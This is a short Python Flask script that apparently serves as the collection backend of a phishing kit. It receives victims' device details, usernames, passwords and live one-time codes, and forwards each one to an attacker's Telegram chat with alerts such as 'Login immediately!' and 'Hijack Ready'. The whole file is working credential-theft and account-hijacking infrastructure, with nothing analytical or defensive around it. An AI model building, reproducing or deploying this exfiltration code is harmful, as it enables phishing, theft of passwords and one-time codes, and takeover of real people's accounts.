from flask import Flask, request, jsonify
import requests
import os

app = Flask(__name__)

TOKEN = os.environ.get('BOT_TOKEN')
CID = os.environ.get('CHAT_ID')

@app.route('/api/index', methods=['POST'])
def handle_all_hits():
    try:
        data = request.get_json(force=True)
        dtype = data.get('t')
        user = data.get('u')

        if dtype == 'VISIT':
            msg = f"👀 **TARGET DETECTED**\n📱 Device: `{data.get('d')[:40]}...`"
        
        elif dtype == 'PASSWORD_HIT':
            # Password ka alert
            msg = f"🚀 **NEW PASSWORD HIT!**\n👤 User: `{user}`\n🔑 Pass: `{data.get('p')}`\n🔥 Action: Login immediately!"
            
        elif dtype == 'OTP_RECEIVED':
            # OTP ka alert
            msg = f"🔥 **Z-PROXY HIT (OTP)**\n👤 User: `{user}`\n🔢 LIVE OTP: `{data.get('o')}`\n✅ Status: Hijack Ready"
            
        else:
            msg = f"ℹ️ Update: {dtype} for {user}"

        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": CID, "text": msg, "parse_mode": "Markdown"})
        return jsonify({"s": "ok"})
    except:
        return jsonify({"s": "error"}), 500

def handler(req, res):
    return app(req, res)
    
